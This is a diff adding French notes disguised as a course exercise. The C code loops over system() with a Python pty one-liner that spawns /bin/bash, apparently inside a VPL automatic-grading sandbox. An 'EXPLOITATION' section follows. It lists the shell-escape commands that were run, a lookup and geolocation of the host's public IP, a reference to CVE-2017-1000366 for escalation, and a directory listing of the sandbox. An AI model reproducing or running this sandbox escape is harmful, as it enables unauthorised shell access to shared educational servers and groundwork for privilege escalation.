@@ -1,0 +1,70 @@
+init à l'algo ==> chap 3 ==> ex 20 
+
+
+########################################################
+######################### CODE #########################
+########################################################
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+
+    int quit = 1;
+    while(quit == 1){
+        //printf(">>");
+        //const char * command[50]; 
+        //scanf("%s", &command);
+        
+        const char * command = "python -c 'import pty; pty.spawn(\"/bin/bash\")'";
+       int cr = system( command );
+        if ( cr != 0 ) {
+            fprintf( stderr, 
+                     "Impossible de lancer la commande : %s\n",
+                     command );
+        }
+        printf("/n");
+    }
+    return 0;
+}
+
+########################################################
+################## EXPLOITATION ########################
+########################################################
+commande executés:
+
+python3
+
+import os
+
+os.system("commande")
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+host myip.opendns.com resolver1.opendns.com | grep "myip.opendns.com has" 
+185.126.228.92
+
+IP Address		Country	Region			City
+185.126.228.92	France 	Ile-de-France	Nanterre
+ISP	Organization	Latitude	Longitude
+Moji SAS
+
+
+while read line; do
+  echo $line;
+done <file.txt
+
+voir faille CVE-2017-1000366
+
+########################################################
+
+>>> os.system("ls -la")                                                         
+total 40                                                                        
+drwx------ 2 p11467 p11467   160 mai    3 18:03 .                               
+drwx--x--x 3 root   root      60 mai    3 18:03 ..                              
+-rwx------ 1 p11467 p11467  5137 mai    3 18:03 common_script.sh                
+-rw------- 1 p11467 p11467   423 mai    3 18:03 test.c                          
+-rwx------ 1 p11467 p11467   158 mai    3 18:03 vpl_environment.sh              
+-rwxr-xr-x 1 p11467 p11467 16792 mai    3 18:03 vpl_execution                   
+-rwx------ 1 p11467 p11467   300 mai    3 18:03 .vpl_launcher.sh                
+-rw-r--r-- 1 p11467 p11467     0 mai    3 18:03 .vpl_set_locale_error
